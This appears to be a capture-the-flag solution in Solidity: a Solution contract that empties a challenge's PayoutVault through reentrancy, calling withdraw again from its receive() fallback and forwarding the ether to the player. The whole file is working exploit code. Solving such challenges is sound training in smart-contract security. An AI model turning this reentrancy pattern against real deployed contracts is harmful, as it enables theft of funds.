// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    PayoutVault private vault;
    address private player;
    uint256 private amount;

    function solve(Setup setup) external payable {
        player = msg.sender;
        vault = setup.vault();
        amount = msg.value;

        vault.depositFor{value: amount}(address(this));
        vault.withdraw();

        (bool ok,) = payable(player).call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw();
        }
    }
}